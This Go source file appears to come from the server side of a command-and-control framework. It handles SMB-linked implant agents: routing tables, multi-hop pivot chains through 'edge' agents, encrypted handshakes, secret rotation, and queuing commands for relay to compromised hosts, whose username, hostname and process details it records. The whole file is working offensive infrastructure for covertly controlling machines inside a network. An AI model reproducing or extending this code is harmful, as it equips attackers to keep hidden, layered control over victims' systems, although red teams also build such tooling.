// internal/agent/listeners/handler_link.go
package listeners

import (
	"c2/internal/common/config"
	pb "c2/proto"
	"context"
	"crypto"
	"crypto/aes"
	"crypto/cipher"
	"crypto/hmac"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"log"
	"sync"
	"time"
)

// LinkRouting manages the routing table for linked agents
type LinkRouting struct {
	mu                        sync.RWMutex
	db                        *sql.DB
	config                    *config.SMBLinkConfig
	pendingHandshakeResponses map[string][]*LinkCommandItem // edgeClientID -> pending responses
}

// LinkDataItem represents a single linked agent's data in a POST request
type LinkDataItem struct {
	RoutingID string `json:"r"`  // Short routing ID
	Payload   string `json:"p"`  // Base64 encoded, encrypted with linked agent's secret
}

// LinkHandshakeItem represents a handshake from a newly linked agent
type LinkHandshakeItem struct {
	RoutingID string `json:"r"`  // Short routing ID assigned by edge agent
	Payload   string `json:"p"`  // RSA+AES encrypted handshake blob
}

// LinkCommandItem represents a command destined for a linked agent
type LinkCommandItem struct {
	RoutingID string `json:"r"`  // Short routing ID
	Payload   string `json:"p"`  // Encrypted command payload
}

// NewLinkRouting creates a new link routing manager
func NewLinkRouting(db *sql.DB) (*LinkRouting, error) {
	cfg, err := config.GetSMBLinkConfig()
	if err != nil {
		// Use defaults if config not available
		cfg = &config.SMBLinkConfig{
			ConnectionTimeout: 30,
			MaxMessageSize:    1048576,
			HeartbeatInterval: 60,
			Malleable: config.SMBLinkMalleable{
				LinkDataField:              "ld",
				LinkCommandsField:          "lc",
				LinkHandshakeField:         "lh",
				LinkHandshakeResponseField: "lr",
				RoutingIDField:             "r",
				PayloadField:               "p",
			},
		}
	}

	return &LinkRouting{
		db:                        db,
		config:                    cfg,
		pendingHandshakeResponses: make(map[string][]*LinkCommandItem),
	}, nil
}

// RegisterLink registers a new link routing entry
func (lr *LinkRouting) RegisterLink(edgeClientID, routingID, linkedClientID, linkType string) error {
	lr.mu.Lock()
	defer lr.mu.Unlock()

	_, err := lr.db.Exec(`
		INSERT INTO link_routing (edge_clientID, routing_id, linked_clientID, link_type, created_at, last_seen, status)
		VALUES ($1, $2, $3, $4, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP, 'active')
		ON CONFLICT (edge_clientID, routing_id)
		DO UPDATE SET linked_clientID = $3, link_type = $4, last_seen = CURRENT_TIMESTAMP, status = 'active'`,
		edgeClientID, routingID, linkedClientID, linkType)

	if err != nil {
		return fmt.Errorf("failed to register link: %w", err)
	}

	log.Printf("[LinkRouting] Registered link: edge=%s, routing=%s -> linked=%s (%s)",
		edgeClientID, routingID, linkedClientID, linkType)
	return nil
}

// ResolveRoutingID looks up the real clientID for a routing ID
func (lr *LinkRouting) ResolveRoutingID(edgeClientID, routingID string) (string, error) {
	lr.mu.RLock()
	defer lr.mu.RUnlock()

	var linkedClientID string
	err := lr.db.QueryRow(`
		SELECT linked_clientID FROM link_routing
		WHERE edge_clientID = $1 AND routing_id = $2 AND status = 'active'`,
		edgeClientID, routingID).Scan(&linkedClientID)

	if err != nil {
		if err == sql.ErrNoRows {
			return "", fmt.Errorf("no link found for edge=%s, routing=%s", edgeClientID, routingID)
		}
		return "", fmt.Errorf("failed to resolve routing ID: %w", err)
	}

	return linkedClientID, nil
}

// UpdateLastSeen updates the last_seen timestamp for a link
func (lr *LinkRouting) UpdateLastSeen(edgeClientID, routingID string) error {
	_, err := lr.db.Exec(`
		UPDATE link_routing SET last_seen = CURRENT_TIMESTAMP
		WHERE edge_clientID = $1 AND routing_id = $2`,
		edgeClientID, routingID)
	return err
}

// DisconnectLink marks a link as disconnected and clears the parent relationship
func (lr *LinkRouting) DisconnectLink(edgeClientID, routingID string) (string, error) {
	lr.mu.Lock()
	defer lr.mu.Unlock()

	// First, get the linked_clientID so we can clear its parent relationship
	var linkedClientID string
	err := lr.db.QueryRow(`
		SELECT linked_clientID FROM link_routing
		WHERE edge_clientID = $1 AND routing_id = $2`,
		edgeClientID, routingID).Scan(&linkedClientID)

	if err != nil {
		return "", fmt.Errorf("failed to find link for disconnect: %w", err)
	}

	// Mark the link as disconnected
	_, err = lr.db.Exec(`
		UPDATE link_routing SET status = 'disconnected'
		WHERE edge_clientID = $1 AND routing_id = $2`,
		edgeClientID, routingID)

	if err != nil {
		return linkedClientID, fmt.Errorf("failed to disconnect link: %w", err)
	}

	// Clear the parent relationship in the connections table
	_, err = lr.db.Exec(`
		UPDATE connections SET parent_clientID = NULL, link_type = NULL
		WHERE newclientID = $1`,
		linkedClientID)

	if err != nil {
		log.Printf("[LinkRouting] Warning: Failed to clear parent relationship for %s: %v", linkedClientID, err)
		// Don't return error here - the link is already disconnected
	}

	log.Printf("[LinkRouting] Disconnected link: edge=%s, routing=%s, linked=%s (parent cleared)",
		edgeClientID, routingID, linkedClientID)
	return linkedClientID, nil
}

// StorePendingHandshakeResponse stores a handshake response to be sent to an edge agent
func (lr *LinkRouting) StorePendingHandshakeResponse(edgeClientID string, response *LinkCommandItem) {
	lr.mu.Lock()
	defer lr.mu.Unlock()
	lr.pendingHandshakeResponses[edgeClientID] = append(lr.pendingHandshakeResponses[edgeClientID], response)
	log.Printf("[LinkRouting] Stored pending handshake response for edge %s, routing %s", edgeClientID, response.RoutingID)
}

// GetPendingHandshakeResponses retrieves and clears pending handshake responses for an edge agent
func (lr *LinkRouting) GetPendingHandshakeResponses(edgeClientID string) []*LinkCommandItem {
	lr.mu.Lock()
	defer lr.mu.Unlock()
	responses := lr.pendingHandshakeResponses[edgeClientID]
	delete(lr.pendingHandshakeResponses, edgeClientID)
	return responses
}

// PeekPendingHandshakeResponses returns pending handshake responses WITHOUT clearing them
// Used to check if we should hold back commands until handshake is delivered
func (lr *LinkRouting) PeekPendingHandshakeResponses(edgeClientID string) []*LinkCommandItem {
	lr.mu.RLock()
	defer lr.mu.RUnlock()
	return lr.pendingHandshakeResponses[edgeClientID]
}

// GetLinkedAgents returns all active linked agents for an edge agent
func (lr *LinkRouting) GetLinkedAgents(edgeClientID string) ([]string, error) {
	lr.mu.RLock()
	defer lr.mu.RUnlock()

	rows, err := lr.db.Query(`
		SELECT linked_clientID FROM link_routing
		WHERE edge_clientID = $1 AND status = 'active'`,
		edgeClientID)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var agents []string
	for rows.Next() {
		var clientID string
		if err := rows.Scan(&clientID); err != nil {
			continue
		}
		agents = append(agents, clientID)
	}

	return agents, nil
}

// processLinkData handles link data from an edge agent's POST
// This is called from handler_active.go after decrypting the edge agent's payload
func (m *Manager) processLinkData(ctx context.Context, tx *sql.Tx, edgeClientID string, linkData []interface{}) error {
	if m.linkRouting == nil {
		var err error
		m.linkRouting, err = NewLinkRouting(m.db)
		if err != nil {
			return fmt.Errorf("failed to initialize link routing: %w", err)
		}
	}

	cfg := m.linkRouting.config.GetMalleable()

	for _, item := range linkData {
		itemMap, ok := item.(map[string]interface{})
		if !ok {
			log.Printf("[LinkData] Invalid link data item format")
			continue
		}

		routingID, _ := itemMap[cfg.RoutingIDField].(string)
		payload, _ := itemMap[cfg.PayloadField].(string)

		if routingID == "" || payload == "" {
			log.Printf("[LinkData] Missing routing_id or payload in link data")
			continue
		}

		// Try to resolve the routing ID to the real clientID
		// If it fails, this might be a new handshake from an unregistered SMB agent
		linkedClientID, err := m.linkRouting.ResolveRoutingID(edgeClientID, routingID)
		if err != nil {
			// Unknown routing ID - this is likely a new handshake
			log.Printf("[LinkData] Unknown routing ID %s, treating as handshake", routingID)

			// Process as a handshake
			response, err := m.processLinkHandshake(ctx, edgeClientID, itemMap)
			if err != nil {
				log.Printf("[LinkData] Failed to process as handshake: %v", err)
				continue
			}

			// Store the handshake response to be sent back
			if response != nil {
				m.storeLinkHandshakeResponse(edgeClientID, response)
				log.Printf("[LinkData] Handshake processed, response queued for routing_id %s", routingID)
			}
			continue
		}

		// Get the linked agent's connection info
		linkedConn, err := m.activeConnections.GetConnection(linkedClientID)
		if err != nil {
			log.Printf("[LinkData] No active connection for linked agent %s: %v", linkedClientID, err)
			continue
		}

		// Decrypt the payload with the linked agent's secret
		decryptedPayload, err := decryptLinkedPayload(payload, linkedConn.Secret1)
		if err != nil {
			log.Printf("[LinkData] Failed to decrypt linked payload: %v", err)
			continue
		}

		// DEBUG: Log the decrypted payload to see what we received
		log.Printf("[LinkData] DEBUG: Decrypted payload from linked agent %s: %s", linkedClientID, string(decryptedPayload))

		// Parse the decrypted payload - now includes potential nested link data
		var linkedData struct {
			AgentID            string                   `json:"agent_id"`
			Results            []map[string]interface{} `json:"results"`
			NestedLinkData     []interface{}            `json:"ld"` // Link data from grandchild agents
			UnlinkNotifications []interface{}           `json:"lu"` // Unlink notifications from children
		}
		if err := json.Unmarshal(decryptedPayload, &linkedData); err != nil {
			log.Printf("[LinkData] Failed to parse linked payload: %v", err)
			continue
		}

		// DEBUG: Log the parsed results
		log.Printf("[LinkData] DEBUG: Parsed %d results from linked agent, %d nested link items, %d unlink notifications",
			len(linkedData.Results), len(linkedData.NestedLinkData), len(linkedData.UnlinkNotifications))
		for i, result := range linkedData.Results {
			log.Printf("[LinkData] DEBUG: Result[%d]: command=%v, output_length=%d, exit_code=%v",
				i, result["command"], len(fmt.Sprintf("%v", result["output"])), result["exit_code"])
		}

		// Process the linked agent's results
		if err := m.processResults(ctx, tx, linkedClientID, linkedData.Results); err != nil {
			log.Printf("[LinkData] Failed to process linked results: %v", err)
			continue
		}

		// RECURSIVE: Process nested link data from grandchild agents
		// This enables multi-hop chains: HTTPS -> SMB -> SMB -> SMB
		if len(linkedData.NestedLinkData) > 0 {
			log.Printf("[LinkData] Processing %d nested link data items from %s (multi-hop chain)",
				len(linkedData.NestedLinkData), linkedClientID)
			if err := m.processLinkData(ctx, tx, linkedClientID, linkedData.NestedLinkData); err != nil {
				log.Printf("[LinkData] Failed to process nested link data: %v", err)
				// Don't fail the entire operation - continue with this agent's data
			}
		}

		// Process unlink notifications from child agents
		if len(linkedData.UnlinkNotifications) > 0 {
			log.Printf("[LinkData] Processing %d unlink notifications from %s",
				len(linkedData.UnlinkNotifications), linkedClientID)
			m.processUnlinkNotifications(ctx, linkedClientID, linkedData.UnlinkNotifications)
		}

		// Rotate the linked agent's secrets
		if err := m.rotateLinkedSecrets(linkedConn); err != nil {
			log.Printf("[LinkData] Failed to rotate linked secrets: %v", err)
		}

		// Update last seen in link_routing table
		m.linkRouting.UpdateLastSeen(edgeClientID, routingID)

		// Update last seen in connections table for the linked agent
		_, err = tx.ExecContext(ctx, `
			UPDATE connections SET lastSEEN = CURRENT_TIMESTAMP WHERE newclientID = $1`,
			linkedClientID)
		if err != nil {
			log.Printf("[LinkData] Warning: Failed to update lastSEEN for linked agent %s: %v", linkedClientID, err)
		}

		// Broadcast last seen update to websocket clients
		if m.commandBuffer != nil {
			if err := m.commandBuffer.BroadcastLastSeen(linkedClientID, time.Now().Unix()); err != nil {
				log.Printf("[LinkData] Warning: Failed to broadcast last seen for linked agent %s: %v", linkedClientID, err)
			} else {
				log.Printf("[LinkData] Broadcast last seen for linked agent %s", linkedClientID)
			}
		}

		log.Printf("[LinkData] Processed data from linked agent %s via edge %s", linkedClientID, edgeClientID)
	}

	return nil
}

// processUnlinkNotifications handles unlink notifications from an edge agent
// When the edge agent disconnects from an SMB agent, it sends a notification
// so we can clear the parent relationship and notify clients
func (m *Manager) processUnlinkNotifications(ctx context.Context, edgeClientID string, unlinkData []interface{}) {
	if m.linkRouting == nil {
		var err error
		m.linkRouting, err = NewLinkRouting(m.db)
		if err != nil {
			log.Printf("[UnlinkNotification] Failed to initialize link routing: %v", err)
			return
		}
	}

	for _, item := range unlinkData {
		routingID, ok := item.(string)
		if !ok {
			log.Printf("[UnlinkNotification] Invalid routing ID format")
			continue
		}

		// Disconnect the link and get the linked client ID
		linkedClientID, err := m.linkRouting.DisconnectLink(edgeClientID, routingID)
		if err != nil {
			log.Printf("[UnlinkNotification] Failed to disconnect link %s: %v", routingID, err)
			continue
		}

		log.Printf("[UnlinkNotification] Disconnected link: edge=%s, routing=%s, linked=%s",
			edgeClientID, routingID, linkedClientID)

		// Broadcast the unlink event to websocket clients
		if m.commandBuffer != nil {
			if err := m.commandBuffer.BroadcastLinkUpdate(linkedClientID, "", ""); err != nil {
				log.Printf("[UnlinkNotification] Warning: Failed to broadcast unlink for %s: %v", linkedClientID, err)
			} else {
				log.Printf("[UnlinkNotification] Broadcast unlink for agent %s", linkedClientID)
			}
		}
	}
}

// processLinkHandshake handles a new link handshake from an SMB agent
func (m *Manager) processLinkHandshake(ctx context.Context, edgeClientID string, handshake map[string]interface{}) (*LinkCommandItem, error) {
	if m.linkRouting == nil {
		var err error
		m.linkRouting, err = NewLinkRouting(m.db)
		if err != nil {
			return nil, fmt.Errorf("failed to initialize link routing: %w", err)
		}
	}

	cfg := m.linkRouting.config.GetMalleable()

	routingID, _ := handshake[cfg.RoutingIDField].(string)
	payload, _ := handshake[cfg.PayloadField].(string)

	if routingID == "" || payload == "" {
		return nil, fmt.Errorf("missing routing_id or payload in handshake")
	}

	log.Printf("[LinkHandshake] Processing handshake from routing_id=%s via edge=%s", routingID, edgeClientID)

	// The payload is RSA+AES encrypted just like a normal handshake
	// We need to find the init data by trying to decrypt with known init secrets
	// This is done by extracting the clientID from the metadata

	// Decode the base64 payload
	payloadBytes, err := base64.StdEncoding.DecodeString(payload)
	if err != nil {
		return nil, fmt.Errorf("failed to decode handshake payload: %w", err)
	}

	// Parse the outer envelope to get the encrypted_key and encrypted_data
	var envelope struct {
		EncryptedKey  string `json:"encrypted_key"`
		EncryptedData string `json:"encrypted_data"`
	}
	if err := json.Unmarshal(payloadBytes, &envelope); err != nil {
		return nil, fmt.Errorf("failed to parse handshake envelope: %w", err)
	}

	// Try to find matching init data and decrypt
	// We need to iterate through init data to find the matching one
	var matchedInit *InitData
	var decryptedSysInfo []byte

	for clientID, initData := range m.initData {
		// Reconstruct the JSON for DecryptDoubleEncrypted
		envelopeJSON, _ := json.Marshal(envelope)
		decrypted, err := DecryptDoubleEncrypted(
			string(envelopeJSON),
			initData.RSAKey,
			initData.Secret,
		)
		if err != nil {
			continue // Try next init data
		}

		// Successfully decrypted - this is our agent
		matchedInit = initData
		decryptedSysInfo = []byte(decrypted)
		log.Printf("[LinkHandshake] Matched init data for clientID=%s", clientID)
		break
	}

	if matchedInit == nil {
		return nil, fmt.Errorf("no matching init data found for handshake")
	}

	// Parse the system info
	var sysInfo SystemInfo
	if err := json.Unmarshal(decryptedSysInfo, &sysInfo); err != nil {
		return nil, fmt.Errorf("failed to parse system info: %w", err)
	}

	// Generate secrets from the seed (same as normal handshake)
	secret1, secret2 := generateInitialSecrets(matchedInit.Secret, sysInfo.AgentInfo.Seed)

	// Get external IP from edge agent's connection (linked agents don't have direct external IP)
	edgeConn, _ := m.activeConnections.GetConnection(edgeClientID)
	extIP := ""
	if edgeConn != nil {
		// We'll mark it as coming through the edge
		extIP = fmt.Sprintf("via:%s", edgeClientID[:8])
	}

	// Check if this SMB agent already exists (reconnection scenario)
	// Match by clientID (init ID) and protocol SMB, hostname, and process name
	var existingClientID string
	err = m.db.QueryRowContext(ctx, `
		SELECT newclientID FROM connections
		WHERE clientID = $1 AND protocol = 'SMB'
		AND hostname = $2 AND process = $3
		AND deleted_at IS NULL
		LIMIT 1`,
		matchedInit.ClientID,
		sysInfo.AgentInfo.Hostname,
		sysInfo.AgentInfo.ProcessName,
	).Scan(&existingClientID)

	var newClientID string
	var isReconnect bool

	if err == nil && existingClientID != "" {
		// Existing SMB agent found - update it instead of creating new
		isReconnect = true
		newClientID = existingClientID
		log.Printf("[LinkHandshake] Reconnecting existing SMB agent %s to new parent %s", newClientID, edgeClientID)

		// Update the existing connection with new secrets and parent
		_, err = m.db.ExecContext(ctx, `
			UPDATE connections SET
				secret1 = $1, secret2 = $2,
				extIP = $3, parent_clientID = $4,
				lastSEEN = CURRENT_TIMESTAMP,
				pid = $5
			WHERE newclientID = $6`,
			secret1, secret2,
			extIP, edgeClientID,
			fmt.Sprintf("%d", sysInfo.AgentInfo.PID),
			newClientID,
		)
		if err != nil {
			return nil, fmt.Errorf("failed to update linked connection: %w", err)
		}

		// Update active connections with new secrets
		m.activeConnections.AddConnection(&ActiveConnection{
			ClientID: newClientID,
			Protocol: "SMB",
			Secret1:  secret1,
			Secret2:  secret2,
		})
	} else {
		// New SMB agent - create new entry
		isReconnect = false
		newClientID = generateNewClientID()

		// Store the connection with parent reference
		_, err = m.db.ExecContext(ctx, `
			INSERT INTO connections (
				newclientID, clientID, protocol, secret1, secret2,
				extIP, intIP, username, hostname, note,
				process, pid, arch, lastSEEN, os, proto,
				parent_clientID, link_type, hop_count
			) VALUES (
				$1, $2, $3, $4, $5,
				$6, $7, $8, $9, $10,
				$11, $12, $13, CURRENT_TIMESTAMP, $14, $15,
				$16, $17, $18
			)`,
			newClientID,
			matchedInit.ClientID,
			"SMB",
			secret1,
			secret2,
			extIP,
			sysInfo.AgentInfo.InternalIP,
			sysInfo.AgentInfo.Username,
			sysInfo.AgentInfo.Hostname,
			"",
			sysInfo.AgentInfo.ProcessName,
			fmt.Sprintf("%d", sysInfo.AgentInfo.PID),
			sysInfo.AgentInfo.Arch,
			sysInfo.AgentInfo.OS,
			"SMB",
			edgeClientID,
			"smb",
			1, // hop_count = 1 for direct link
		)
		if err != nil {
			return nil, fmt.Errorf("failed to store linked connection: %w", err)
		}

		// Add to active connections
		m.activeConnections.AddConnection(&ActiveConnection{
			ClientID: newClientID,
			Protocol: "SMB",
			Secret1:  secret1,
			Secret2:  secret2,
		})
	}

	// Register the link routing
	if err := m.linkRouting.RegisterLink(edgeClientID, routingID, newClientID, "smb"); err != nil {
		return nil, fmt.Errorf("failed to register link: %w", err)
	}

	if isReconnect {
		// Broadcast link_update for reconnection (re-parenting existing agent)
		if err := m.commandBuffer.BroadcastLinkUpdate(newClientID, edgeClientID, "smb"); err != nil {
			log.Printf("[LinkHandshake] Warning: Failed to broadcast link update: %v", err)
		}
		log.Printf("[LinkHandshake] Successfully re-linked existing agent %s to edge %s", newClientID, edgeClientID)
	} else {
		// Notify websocket service about the new linked agent
		notification := &pb.ConnectionNotification{
			NewClientId:    newClientID,
			ClientId:       matchedInit.ClientID,
			Protocol:       "SMB",
			Secret1:        secret1,
			Secret2:        secret2,
			ExtIp:          extIP,
			IntIp:          sysInfo.AgentInfo.InternalIP,
			Username:       sysInfo.AgentInfo.Username,
			Hostname:       sysInfo.AgentInfo.Hostname,
			Process:        sysInfo.AgentInfo.ProcessName,
			Pid:            fmt.Sprintf("%d", sysInfo.AgentInfo.PID),
			Arch:           sysInfo.AgentInfo.Arch,
			Os:             sysInfo.AgentInfo.OS,
			Proto:          "SMB",
			LastSeen:       time.Now().Unix(),
			ParentClientId: edgeClientID, // Link parent info for UI hierarchy
			LinkType:       "smb",
		}

		if err := m.notifyWebsocketService(notification); err != nil {
			log.Printf("[LinkHandshake] Warning: Failed to notify websocket service: %v", err)
		}
		log.Printf("[LinkHandshake] Successfully registered new linked agent %s via edge %s", newClientID, edgeClientID)
	}

	// Create signed response (same as normal handshake)
	signature, err := signHandshakeResponse(newClientID, sysInfo.AgentInfo.Seed, matchedInit.RSAKey)
	if err != nil {
		return nil, fmt.Errorf("failed to sign response: %w", err)
	}

	// Build response for the SMB agent
	response := SignedResponse{
		Status:             "success",
		NewClientID:        newClientID,
		SecretsInitialized: true,
		Signature:          signature,
		Seed:               sysInfo.AgentInfo.Seed,
	}

	responseJSON, err := json.Marshal(response)
	if err != nil {
		return nil, fmt.Errorf("failed to marshal response: %w", err)
	}

	// The response needs to be sent back through the edge agent
	// It's NOT encrypted here - the edge agent will wrap it
	return &LinkCommandItem{
		RoutingID: routingID,
		Payload:   base64.StdEncoding.EncodeToString(responseJSON),
	}, nil
}

// getCommandsForLinkedAgents retrieves pending commands for all linked agents
// For multi-hop chains, this also recursively gets commands for grandchildren
// and wraps them properly for forwarding through the chain
func (m *Manager) getCommandsForLinkedAgents(edgeClientID string) ([]LinkCommandItem, error) {
	if m.linkRouting == nil {
		return nil, nil
	}

	linkedAgents, err := m.linkRouting.GetLinkedAgents(edgeClientID)
	if err != nil {
		return nil, err
	}

	if len(linkedAgents) == 0 {
		return nil, nil
	}

	var commands []LinkCommandItem
	cfg := m.linkRouting.config.GetMalleable()
	_ = cfg // Will use for field names if needed

	// Check if there are any pending handshake responses for this edge agent
	// If so, we should NOT send commands yet - the SMB agent hasn't completed handshake
	pendingHandshakes := m.linkRouting.PeekPendingHandshakeResponses(edgeClientID)
	pendingRoutingIDs := make(map[string]bool)
	for _, h := range pendingHandshakes {
		if h != nil {
			pendingRoutingIDs[h.RoutingID] = true
		}
	}

	for _, linkedClientID := range linkedAgents {
		// Get routing ID for this linked agent
		var routingID string
		err := m.db.QueryRow(`
			SELECT routing_id FROM link_routing
			WHERE edge_clientID = $1 AND linked_clientID = $2 AND status = 'active'`,
			edgeClientID, linkedClientID).Scan(&routingID)
		if err != nil {
			continue
		}

		// Skip if this routing ID has a pending handshake response
		// The SMB agent needs to receive the handshake response before any commands
		if pendingRoutingIDs[routingID] {
			log.Printf("[LinkCommands] Skipping commands for %s - handshake not yet delivered", linkedClientID)
			continue
		}

		// Get pending commands for this linked agent
		// GetCommand returns []string with a single JSON-encoded string of commands
		pendingCmds, hasCommands := m.commandBuffer.GetCommand(linkedClientID)

		// MULTI-HOP: Also get commands and handshake responses for this agent's children
		// These need to be nested in the payload so the linked agent can forward them
		nestedHandshakes, nestedCommands, _ := m.getPendingLinkResponsesSeparate(linkedClientID)

		// If no commands and no nested data, skip
		if (!hasCommands || len(pendingCmds) == 0) && len(nestedHandshakes) == 0 && len(nestedCommands) == 0 {
			continue
		}

		// Get the linked agent's connection for encryption
		linkedConn, err := m.activeConnections.GetConnection(linkedClientID)
		if err != nil {
			continue
		}

		// Build the payload - can include commands and/or nested link data
		var payload map[string]interface{}

		if hasCommands && len(pendingCmds) > 0 {
			// Parse the commands JSON first
			var cmds []interface{}
			if err := json.Unmarshal([]byte(pendingCmds[0]), &cmds); err == nil {
				payload = map[string]interface{}{
					"commands": cmds,
				}
			}
		}

		// Add nested handshake responses (for grandchildren)
		if len(nestedHandshakes) > 0 {
			if payload == nil {
				payload = make(map[string]interface{})
			}
			payload["lr"] = nestedHandshakes
			log.Printf("[LinkCommands] Including %d nested handshake responses for %s", len(nestedHandshakes), linkedClientID)
		}

		// Add nested commands (for grandchildren)
		if len(nestedCommands) > 0 {
			if payload == nil {
				payload = make(map[string]interface{})
			}
			payload["lc"] = nestedCommands
			log.Printf("[LinkCommands] Including %d nested link commands for %s", len(nestedCommands), linkedClientID)
		}

		// Skip if nothing to send
		if payload == nil {
			continue
		}

		// Marshal the combined payload
		cmdJSON, err := json.Marshal(payload)
		if err != nil {
			log.Printf("[LinkCommands] Failed to marshal payload for %s: %v", linkedClientID, err)
			continue
		}

		encryptedPayload, err := encryptForLinkedAgent(cmdJSON, linkedConn.Secret1)
		if err != nil {
			continue
		}

		commands = append(commands, LinkCommandItem{
			RoutingID: routingID,
			Payload:   encryptedPayload,
		})

		log.Printf("[LinkCommands] Prepared commands for linked agent %s (routing=%s)", linkedClientID, routingID)
	}

	return commands, nil
}

// Helper functions

func decryptLinkedPayload(payload string, secret string) ([]byte, error) {
	// Decode base64
	ciphertext, err := base64.StdEncoding.DecodeString(payload)
	if err != nil {
		return nil, fmt.Errorf("failed to decode base64: %w", err)
	}

	// Derive key from secret
	key := sha256.Sum256([]byte(secret))

	// Create cipher
	block, err := aes.NewCipher(key[:])
	if err != nil {
		return nil, fmt.Errorf("failed to create cipher: %w", err)
	}

	aesGCM, err := cipher.NewGCM(block)
	if err != nil {
		return nil, fmt.Errorf("failed to create GCM: %w", err)
	}

	nonceSize := aesGCM.NonceSize()
	if len(ciphertext) < nonceSize {
		return nil, fmt.Errorf("ciphertext too short")
	}

	nonce := ciphertext[:nonceSize]
	ciphertext = ciphertext[nonceSize:]

	plaintext, err := aesGCM.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return nil, fmt.Errorf("failed to decrypt: %w", err)
	}

	return plaintext, nil
}

func encryptForLinkedAgent(data []byte, secret string) (string, error) {
	// Derive key from secret
	key := sha256.Sum256([]byte(secret))

	// Create cipher
	block, err := aes.NewCipher(key[:])
	if err != nil {
		return "", fmt.Errorf("failed to create cipher: %w", err)
	}

	aesGCM, err := cipher.NewGCM(block)
	if err != nil {
		return "", fmt.Errorf("failed to create GCM: %w", err)
	}

	// Generate cryptographically secure nonce
	nonce := make([]byte, aesGCM.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		return "", fmt.Errorf("failed to generate nonce: %w", err)
	}

	// Encrypt
	ciphertext := aesGCM.Seal(nonce, nonce, data, nil)

	return base64.StdEncoding.EncodeToString(ciphertext), nil
}

func (m *Manager) rotateLinkedSecrets(conn *ActiveConnection) error {
	// Same rotation as regular agents
	newSecret := rotateSecret(conn.Secret1, conn.Secret2)
	conn.Secret2 = conn.Secret1
	conn.Secret1 = newSecret

	// Update in database
	_, err := m.db.Exec(`
		UPDATE connections
		SET secret1 = $1, secret2 = $2, lastSEEN = CURRENT_TIMESTAMP
		WHERE newclientID = $3`,
		conn.Secret1, conn.Secret2, conn.ClientID)

	return err
}

func generateNewClientID() string {
	// Generate UUID - simplified version
	b := make([]byte, 16)
	for i := range b {
		b[i] = byte(time.Now().UnixNano() >> (i * 4))
	}
	return fmt.Sprintf("%x-%x-%x-%x-%x", b[0:4], b[4:6], b[6:8], b[8:10], b[10:16])
}

func signHandshakeResponse(newClientID, seed, rsaKeyPEM string) (string, error) {
	// This should use the same signing logic as handler_handshake.go
	// For now, returning placeholder - will integrate with existing code
	verificationData := fmt.Sprintf("%s:%s", newClientID, seed)
	hashed := sha256.Sum256([]byte(verificationData))

	// Sign with RSA private key
	signature, err := signWithRSAKey(hashed[:], rsaKeyPEM)
	if err != nil {
		return "", err
	}

	return base64.StdEncoding.EncodeToString(signature), nil
}

func rotateSecret(secret1, secret2 string) string {
	// HMAC-based rotation - must match agent side exactly
	// newSecret = HMAC(secret2 as key, secret1 as data)
	h := hmac.New(sha256.New, []byte(secret2))
	h.Write([]byte(secret1))
	return fmt.Sprintf("%x", h.Sum(nil))
}

// storeLinkHandshakeResponse stores a pending handshake response for an edge agent
func (m *Manager) storeLinkHandshakeResponse(edgeClientID string, response *LinkCommandItem) {
	if m.linkRouting == nil {
		var err error
		m.linkRouting, err = NewLinkRouting(m.db)
		if err != nil {
			log.Printf("[LinkRouting] Failed to initialize for storing response: %v", err)
			return
		}
	}
	m.linkRouting.StorePendingHandshakeResponse(edgeClientID, response)
}

// getPendingLinkResponses retrieves all pending link responses for an edge agent
// This includes handshake responses and commands for linked agents
// DEPRECATED: Use getPendingLinkResponsesSeparate instead for proper separation
func (m *Manager) getPendingLinkResponses(edgeClientID string) ([]LinkCommandItem, error) {
	handshakes, commands, err := m.getPendingLinkResponsesSeparate(edgeClientID)
	if err != nil {
		return nil, err
	}
	// Combine for backwards compatibility
	var all []LinkCommandItem
	all = append(all, handshakes...)
	all = append(all, commands...)
	return all, nil
}

// getPendingLinkResponsesSeparate retrieves pending handshake responses and commands separately
// This allows the server to send them in different fields (lr for handshakes, lc for commands)
// so the HTTPS agent can forward them with the correct message type
func (m *Manager) getPendingLinkResponsesSeparate(edgeClientID string) (handshakes []LinkCommandItem, commands []LinkCommandItem, err error) {
	if m.linkRouting == nil {
		return nil, nil, nil
	}

	// Get pending handshake responses
	handshakeResponses := m.linkRouting.GetPendingHandshakeResponses(edgeClientID)
	for _, r := range handshakeResponses {
		if r != nil {
			handshakes = append(handshakes, *r)
		}
	}

	// Get commands for linked agents
	commands, err = m.getCommandsForLinkedAgents(edgeClientID)
	if err != nil {
		log.Printf("[LinkRouting] Failed to get commands for linked agents: %v", err)
		err = nil // Don't fail completely, just log the warning
	}

	return handshakes, commands, nil
}

// signWithRSAKey signs data with an RSA private key
// The RSA key is stored base64-encoded in the database, and the decoded content is PEM format
func signWithRSAKey(data []byte, rsaKeyBase64 string) ([]byte, error) {
	// First, base64 decode to get the PEM data (matches handler_handshake.go pattern)
	pemData, err := base64.StdEncoding.DecodeString(rsaKeyBase64)
	if err != nil {
		// If base64 decode fails, try treating it as raw PEM
		pemData = []byte(rsaKeyBase64)
	}

	// Parse PEM block
	block, _ := pem.Decode(pemData)
	if block == nil {
		return nil, fmt.Errorf("failed to parse PEM block from RSA key")
	}

	// Parse private key (PKCS1 format)
	privateKey, err := x509.ParsePKCS1PrivateKey(block.Bytes)
	if err != nil {
		// Try PKCS8 as fallback
		key, err := x509.ParsePKCS8PrivateKey(block.Bytes)
		if err != nil {
			return nil, fmt.Errorf("failed to parse private key: %w", err)
		}
		var ok bool
		privateKey, ok = key.(*rsa.PrivateKey)
		if !ok {
			return nil, fmt.Errorf("key is not RSA private key")
		}
	}

	// Sign with PKCS1v15
	signature, err := rsa.SignPKCS1v15(rand.Reader, privateKey, crypto.SHA256, data)
	if err != nil {
		return nil, fmt.Errorf("failed to sign: %w", err)
	}

	return signature, nil
}
